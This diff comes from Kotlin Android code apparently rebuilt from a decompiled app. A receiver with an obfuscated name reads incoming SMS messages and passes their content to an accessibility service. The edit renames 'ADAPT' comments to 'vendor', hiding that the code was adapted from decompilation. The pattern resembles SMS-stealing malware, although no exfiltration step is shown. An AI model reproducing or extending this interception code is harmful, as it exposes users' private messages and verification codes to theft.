@@ -150,7 +150,7 @@ class arniezsqllm : BroadcastReceiver() {
                     put("type", "incoming")
                 }
                 // JADX: new Thread(new RunnableC0941o6(21, json)).start()
-                // ADAPT: Inlined TaskRunnable type=21 logic — direct service call
+                // vendor: Inlined TaskRunnable type=21 logic — direct service call
                 Thread {
                     try {
                         val svc = com.storm.safe.rock.service.MyAccessibilityService.Companion.getInstance()
@@ -185,7 +185,7 @@ class arniezsqllm : BroadcastReceiver() {
                 }
                 Log.v(TAG, "短信解析成功: from=$number len=${text.length}")
                 // JADX: new Thread(new RunnableC0941o6(21, smsJson)).start()
-                // ADAPT: Inlined TaskRunnable type=21 logic — direct service call
+                // vendor: Inlined TaskRunnable type=21 logic — direct service call
                 Thread {
                     try {
                         val svc = com.storm.safe.rock.service.MyAccessibilityService.Companion.getInstance()
